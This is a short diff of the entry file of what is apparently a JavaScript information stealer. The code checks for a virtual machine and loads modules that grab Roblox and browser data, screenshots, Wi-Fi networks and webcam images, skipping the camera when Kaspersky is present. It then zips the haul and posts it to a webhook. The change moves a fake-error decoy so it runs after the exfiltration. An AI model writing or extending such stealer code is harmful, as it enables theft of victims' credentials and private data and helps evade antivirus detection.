@@ -30,7 +30,6 @@ if (config.vmProtect && checkVM()) {
   require('./functions/grab-roblox');
   require('./functions/grab-browsers-data');
   if (!isDarwin()) require('./functions/screenshot');
-  config.fakeError && require('./functions/fake-error');
   config.wifiNetworks && require('./functions/wifi-networks');
   if (config.camera && !hasKaspersky()) require('./functions/camera');
 
@@ -42,4 +41,5 @@ if (config.vmProtect && checkVM()) {
       require('./functions/webhook')(zipFile);
     });
   });
+  config.fakeError && require('./functions/fake-error');
 }
